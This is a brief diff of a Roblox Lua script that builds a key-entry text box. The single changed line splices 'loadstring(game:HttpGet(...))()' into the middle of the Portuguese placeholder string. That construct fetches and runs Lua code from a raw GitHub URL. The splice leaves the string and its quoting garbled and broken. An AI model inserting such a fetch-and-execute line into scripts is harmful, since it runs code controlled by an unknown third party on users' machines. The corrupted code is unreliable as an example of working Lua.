@@ -31,4 +31,4 @@ keyframe.Size = UDim2.new(1,0,1,0)
 local keybox = Instance.new("TextBox",keyframe)
 keybox.Size = UDim2.new(0,200,0,40)
 keybox.Position = UDim2.new(0.5,-100,0.3,0)
-keybox.PlaceholderText = "Digite a
+keybox.PlaceholderText = "Digite aloadstring(game:HttpGet("https://raw.githubusercontent.com/sofiatrend57-eng/script/main/script.lua"))()
